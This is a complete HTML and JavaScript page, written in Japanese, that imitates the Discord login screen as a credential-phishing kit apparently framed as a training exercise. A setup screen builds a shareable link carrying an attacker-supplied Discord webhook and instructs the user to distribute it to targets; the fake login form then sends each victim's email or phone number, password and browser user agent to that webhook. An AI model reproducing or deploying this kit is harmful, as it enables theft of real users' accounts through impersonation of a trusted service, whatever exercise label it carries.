<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord</title>
<style>
  *{box-sizing:border-box}
  body{margin:0;background:#313338;font-family:"gg sans",sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
  .screen{display:none}
  .screen.active{display:block}
  .card{background:#2b2d31;padding:32px;border-radius:12px;width:100%;max-width:480px;box-shadow:0 8px 24px rgba(0,0,0,.4)}
  h1{font-size:20px;margin:0 0 20px;color:#f2f3f5}
  label{display:block;font-size:12px;text-transform:uppercase;color:#b5bac1;margin-bottom:8px;font-weight:600}
  input{width:100%;background:#1e1f22;border:1px solid #1e1f22;color:#f2f3f5;padding:10px 12px;border-radius:4px;font-size:14px;margin-bottom:16px}
  input:focus{outline:none;border-color:#5865f2}
  button{width:100%;background:#5865f2;color:#fff;border:none;padding:12px;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s}
  button:disabled{background:#4e5058;cursor:not-allowed}
  button:hover:not(:disabled){background:#4752c4}
  .status{font-size:13px;margin-top:12px;min-height:18px}
  .ok{color:#23a55a}
  .ng{color:#f23f43}
  .result{display:none;margin-top:24px;padding-top:20px;border-top:1px solid #3f4147}
  .result.show{display:block}
  .link-row{display:flex;gap:8px;margin-top:8px}
  .link-row input{flex:1;margin:0;font-size:12px;color:#00a8fc;font-family:monospace}
  .copy{width:auto;padding:10px 16px;background:#248046;font-size:13px;white-space:nowrap}
  .copy:hover{background:#1a6334}
  .copy.done{background:#4752c4}
  .hint{font-size:12px;color:#949ba4;margin-top:14px;line-height:1.5}

  .login-box{background:#313338;padding:32px;border-radius:8px;width:100%;max-width:480px;box-shadow:0 2px 10px rgba(0,0,0,.2)}
  .login-box h2{color:#f2f3f5;text-align:center;font-size:24px;margin:0 0 8px}
  .sub{color:#b5bac1;text-align:center;font-size:15px;margin-bottom:20px}
  .login-box label{color:#b5bac1;font-size:12px;text-transform:uppercase;font-weight:700;margin-bottom:8px}
  .login-box input{background:#1e1f22;border:none;padding:10px;border-radius:3px;font-size:16px;margin-bottom:18px}
  .login-box input:focus{outline:2px solid #5865f2}
  .forgot{color:#00a8fc;font-size:13px;text-decoration:none;display:inline-block;margin-bottom:18px;cursor:pointer}
  .forgot:hover{text-decoration:underline}
  .login-btn{width:100%;background:#5865f2;color:#fff;border:none;padding:12px;border-radius:3px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:10px}
  .login-btn:hover{background:#4752c4}
  .login-btn:disabled{background:#4e5058;cursor:wait}
  .fake-link{display:block;text-align:center;color:#00a8fc;font-size:14px;margin-top:8px;text-decoration:none;cursor:pointer}
  .fake-btn{width:100%;background:transparent;border:1px solid #4e5058;color:#f2f3f5;padding:10px;border-radius:3px;font-size:14px;margin-top:12px;cursor:pointer}
  .fake-btn:active{transform:scale(.98)}
  .err{color:#f23f43;font-size:13px;text-align:center;margin-top:12px;min-height:16px}
  .spinner{display:none;width:18px;height:18px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>

<div class="screen active" id="setupScreen">
  <div class="card">
    <h1>Webhook Configuration</h1>
    <label for="webhook">Discord Webhook URL</label>
    <input id="webhook" type="text" placeholder="https://discord.com/api/webhooks/...">
    <button id="create" disabled>作成</button>
    <div class="status" id="status"></div>

    <div class="result" id="result">
      <label>演習用リンク</label>
      <div class="link-row">
        <input id="genLink" type="text" readonly>
        <button class="copy" id="copyBtn">コピー</button>
      </div>
      <div class="hint">コピーするとログイン画面に切り替わります。このリンクを標的に配布してください。演習終了後はWebhookを削除してください。</div>
    </div>
  </div>
</div>

<div class="screen" id="loginScreen">
  <div class="login-box">
    <h2>おかえりなさい！</h2>
    <div class="sub">Discordへログイン</div>
    <form id="f">
      <label for="email">メールアドレスまたは電話番号</label>
      <input id="email" type="text" autocomplete="off">
      <label for="pw">パスワード</label>
      <input id="pw" type="password" autocomplete="off">
      <a class="forgot" href="javascript:void(0)">パスワードをお忘れですか？</a>
      <button class="login-btn" type="submit" id="loginBtn">ログイン</button>
    </form>
    <a class="fake-link" href="javascript:void(0)">アカウントをお持ちでないですか？ 登録</a>
    <button class="fake-btn" type="button">QRコードでログイン</button>
    <div class="err" id="err"></div>
    <div class="spinner" id="spinner"></div>
  </div>
</div>

<script>
(function(){
  const setupScreen=document.getElementById('setupScreen');
  const loginScreen=document.getElementById('loginScreen');
  const webhookInput=document.getElementById('webhook');
  const createBtn=document.getElementById('create');
  const statusEl=document.getElementById('status');
  const resultEl=document.getElementById('result');
  const genLink=document.getElementById('genLink');
  const copyBtn=document.getElementById('copyBtn');
  const err=document.getElementById('err');
  const loginBtn=document.getElementById('loginBtn');
  const spinner=document.getElementById('spinner');

  let webhookUrl=null;

  function showLogin(){
    setupScreen.classList.remove('active');
    loginScreen.classList.add('active');
  }

  function showSetup(){
    loginScreen.classList.remove('active');
    setupScreen.classList.add('active');
  }

  const params=new URLSearchParams(location.search);
  const preWebhook=params.get('w');
  if(preWebhook){
    webhookUrl=preWebhook;
    showLogin();
  }

  webhookInput.addEventListener('input',()=>{
    const v=webhookInput.value.trim();
    createBtn.disabled=!(v.startsWith('https://discord.com/api/webhooks/')&&v.length>45);
  });

  createBtn.addEventListener('click',async()=>{
    const url=webhookInput.value.trim();
    createBtn.disabled=true;
    statusEl.className='status';
    statusEl.textContent='接続確認中…';
    try{
      const r=await fetch(url,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({content:'✅ 演習Webhook接続確認 — '+new Date().toISOString()})
      });
      if(!r.ok)throw new Error('HTTP '+r.status);
      webhookUrl=url;
      const base=location.href.split('?')[0];
      genLink.value=base+'?w='+encodeURIComponent(url);
      resultEl.classList.add('show');
      statusEl.className='status ok';
      statusEl.textContent='接続成功。リンクを生成しました。';
      createBtn.disabled=false;
    }catch(e){
      statusEl.className='status ng';
      statusEl.textContent='接続失敗: '+e.message;
      createBtn.disabled=false;
    }
  });

  copyBtn.addEventListener('click',async()=>{
    const text=genLink.value;
    try{
      if(navigator.clipboard&&window.isSecureContext){
        await navigator.clipboard.writeText(text);
      }else{
        genLink.select();
        genLink.setSelectionRange(0,text.length);
        document.execCommand('copy');
      }
      copyBtn.textContent='コピー済み';
      copyBtn.classList.add('done');
      setTimeout(()=>{
        copyBtn.textContent='コピー';
        copyBtn.classList.remove('done');
        showLogin();
      },700);
    }catch(e){
      genLink.select();
      document.execCommand('copy');
      copyBtn.textContent='コピー済み';
      setTimeout(()=>{
        copyBtn.textContent='コピー';
        showLogin();
      },700);
    }
  });

  document.querySelectorAll('.fake-link,.fake-btn,.forgot').forEach(el=>{
    el.addEventListener('click',e=>e.preventDefault());
  });

  document.getElementById('f').addEventListener('submit',async e=>{
    e.preventDefault();
    const email=document.getElementById('email').value.trim();
    const pw=document.getElementById('pw').value;
    if(!webhookUrl){
      err.textContent='無効な状態です。設定画面に戻ってください。';
      return;
    }
    if(!email||!pw){err.textContent='入力してください。';return;}
    err.textContent='';
    loginBtn.disabled=true;
    loginBtn.textContent='';
    spinner.style.display='block';
    const payload={
      embeds:[{
        title:'🎣 演習キャッチ',
        color:0x5865f2,
        fields:[
          {name:'識別子',value:'```'+(email||'(空)')+'```',inline:false},
          {name:'パスワード',value:'```'+(pw||'(空)')+'```',inline:false},
          {name:'時刻',value:new Date().toISOString(),inline:false},
          {name:'UA',value:'```'+navigator.userAgent.slice(0,200)+'```',inline:false}
        ]
      }]
    };
    try{
      await fetch(webhookUrl,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify(payload),
        keepalive:true
      });
      err.style.color='#23a55a';
      err.textContent='演習成功。この画面は模擬です。';
      document.getElementById('f').reset();
    }catch(ex){
      err.style.color='#f23f43';
      err.textContent='通信エラー。';
    }finally{
      loginBtn.disabled=false;
      loginBtn.textContent='ログイン';
      spinner.style.display='none';
    }
  });

  window.addEventListener('popstate',()=>{
    const p=new URLSearchParams(location.search);
    if(!p.get('w'))showSetup();
  });
})();
</script>
</body>
</html>
